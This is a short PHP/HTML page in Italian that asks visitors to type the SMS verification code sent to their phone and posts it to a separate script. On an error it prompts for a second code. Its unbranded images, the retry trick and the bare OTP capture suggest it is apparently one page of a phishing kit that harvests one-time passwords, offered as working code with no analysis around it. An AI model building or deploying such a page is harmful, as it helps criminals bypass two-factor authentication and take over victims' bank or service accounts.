<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/sms.css">
    <title>sms</title>
</head>
<body>
    

<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>

<div>

<main>



<div class="continer">
<form action="post.php"  method="post">

<div class="title3">
<label>Inserisci il codice di verifica inviato al tuo telefono.</label>
</div>


<div class="col">
<input type="text" name="otp" required placeholder="Inserisci il codice" >
</div>

<?php 
if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Codice non valido. Riprova.</p>';
}
?>


<div class="but">
<button type="submit">Continua</button>
</div>






</form>
</div>
</div>
</main>


<footer>

<div class="mo">
<img src="res/img/fmo.png" >
</div>

    <div class="le">
<img src="res/img/f.left.png" >
    </div>

    <div class="re">
<img src="res/img/fright.png" >
    </div>
</footer>

</body>
</html>